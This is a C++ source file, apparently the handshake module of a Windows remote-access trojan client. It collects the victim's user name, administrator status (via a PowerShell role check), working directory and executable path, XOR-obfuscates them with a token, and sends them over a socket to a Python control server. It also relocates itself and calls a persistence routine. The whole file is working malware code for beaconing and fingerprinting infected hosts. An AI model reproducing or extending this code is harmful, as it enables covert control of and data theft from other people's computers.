#include <iostream>
#include <windows.h>

#include <lmcons.h> // GetUserName UNLEN
#include <direct.h> // _getcwd
//#include <stdlib.h>

#include "../inc/HandShake.h"
#include "../inc/Persistence.h"
#include "../inc/common.h"
#include "../inc/other.h"
#include "../inc/Exec.h"

using namespace  std;

HandShake::HandShake()
{
    cout << "Constructor called handsake:\n" << endl;
    a_name_user = setNameUser();
    a_is_admin = setIsAdmin();
    a_current_directory = setCurrentDirectory();
    a_name_prog = NAME_PROG;
    a_token = TOKEN;
    cout << "TOKEN: " << a_token << endl;
    a_location_prog = setLocationProg();
    cout << "LOCATION PROG: "<<a_location_prog << endl;

}
void HandShake::setSock(int sock)
{
    a_sock = sock;
}
void HandShake::beforeHandShake()
{
    if(AUTO_MOVE) 
    {
        cout << "[+] move prog go" << endl;
        moveProg();
    }
    a_location_prog = setLocationProg();
    cout << "LOCATION PROG: "<<a_location_prog << endl;
    
    if(AUTO_PERSISTENCE)
    {
        Persistence(a_is_admin, a_location_prog).main();
    }

}

void HandShake::startHandShake()
{
    // ' SPLIT ' for split data in python server.py script
    string is_admin;
    string end = "\r\n";

    cout << "\n\nSOCKET STARTHAND: " << a_sock << endl;
    if(a_is_admin)
    {
        //If admin
        is_admin = "MOD_HANDSHAKE_IS_ADMIN" SPLIT "True";
        cout << "is admin in startHandShake: " << is_admin << endl;
    }
    else
    {
        //if not admin
        is_admin = "MOD_HANDSHAKE_IS_ADMIN" SPLIT "False";
        cout << "is admin in startHandShake: " << is_admin << endl;
    }
    //cout << a_location_prog << endl;
    //cout << a_name_user << endl;
    string path_prog = "MOD_HANDSHAKE_PATH_PROG" SPLIT + a_location_prog;
    string name_user = "MOD_HANDSHAKE_NAME_USER"  SPLIT + a_name_user;
    string token = "MOD_HANDSHAKE_TOKEN" SPLIT + a_token;
   
    sendUltraSafe(a_sock, XOREncryption(is_admin));
    cout << "send admin" << endl;

    //01010101001010101010101010010101010101010101001010101010
    cout << "strlen before encrypt path prog: " << strlen(path_prog.c_str()) << endl;
    cout << "size before encrypt path prog: " << path_prog.size() << endl;
    sendUltraSafe(a_sock, XOREncryption(path_prog));
    cout << "path prog " << endl;

    
    sendUltraSafe(a_sock,XOREncryption(name_user));
    cout << "name user" << endl;
    
    sendUltraSafe(a_sock,XOREncryption(token));
    cout << "tokken" << endl;
    
    sendUltraSafe(a_sock,XOREncryption(end)); //GOOD  !
    cout << "[++] HandShakee send all data. " << endl;
//010101010100101010101010101001010101010010101001010101011101010100101010100101010101010010101010101010100101
//010101010100101010101010101001010101010010101001010101011101010100101010100101010101010010101010101010100101

}
bool HandShake::setIsAdmin()
{
    string result;
    cout << "call getamdin" << endl;
    result = Exec().executeCommand("powershell.exe -command \"([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')\"");
    if(result.substr(0,4) == "True") //remove ruturn line.
    {
        //cout << "ADMIN IN setadmin: " << result.substr(0,4) << endl;
        return true;
    }
    else
    {
        //2 cout << "NOT ADMIN IN setadmin: " << result.substr(0,4) << endl;
        return false;
    }
}

string HandShake::setNameUser()
{
    cout << "call genameuser" << endl;
    TCHAR user[UNLEN+1];
    DWORD len_user = UNLEN+1;
    if(GetUserName(user,&len_user) == 0)
    {
        //if error
        return "Unknown";
    }
    else
    {
        string result(&user[0], &user[len_user]); //https://stackoverflow.com/questions/6291458/how-to-convert-a-tchar-array-to-stdstring
        //2 cout <<"name user: " <<result << endl;
        return result.substr(0,result.length()-1);    
    }
    
}

string HandShake::setCurrentDirectory()
{
    cout << "call getcyrrentdirectory" << endl;
    char buffer[PATHLEN];
    _getcwd(buffer,PATHLEN);
    if(buffer == NULL)
    {
        return "Unknown";
    }
    else
    {
        return (string) buffer;
    }
}

string HandShake::setLocationProg()
{
    char buffer[MAX_PATH];

    if(GetModuleFileNameA(NULL, buffer, sizeof(buffer)) == 0)//if error
    {   
        if(_getcwd(buffer,sizeof(buffer)) == 0)//if error
        {
            string result_cmd;
            result_cmd = Exec().executeCommand("pwd");
            return (string) result_cmd + "\\" + NAME_PROG;
        }
        else
        {
            return (string) buffer;
        }
    }
    else
    {
        return (string) buffer;        
    }
}
bool HandShake::getIsAdmin()
{
    return a_is_admin; //ghetter
}

string HandShake::getPathProg()
{
    //cout << "GetPathProg: " << a_location_prog << endl;
    return a_location_prog;
}

string HandShake::getNameUser()
{
    return a_name_user;
}

void HandShake::moveProg()
{
   // Deplace le programme en fonction des privilèges de l'utilisateur.
    cout << "name prog : " << a_name_prog << endl;
    cout << "Location prog: " << a_location_prog << endl;
    if(a_is_admin)
    {   
        if((rename(a_name_prog.c_str(), (a_location_prog).c_str())!=0))
        {   
            perror("Error in move prog ");
            a_location_prog = a_current_directory + "\\" + a_name_prog; //if error
        }
    }
    else
    {
        //C:\Users\cisco\AppData\Roaming\Microsoft
        //if not adminW
        if((rename(a_name_prog.c_str(),(a_location_prog).c_str()))!= 0)
        {
            perror("Error in move prog ");  
            a_location_prog = a_current_directory + "\\" + a_name_prog; 
        }
    }
}
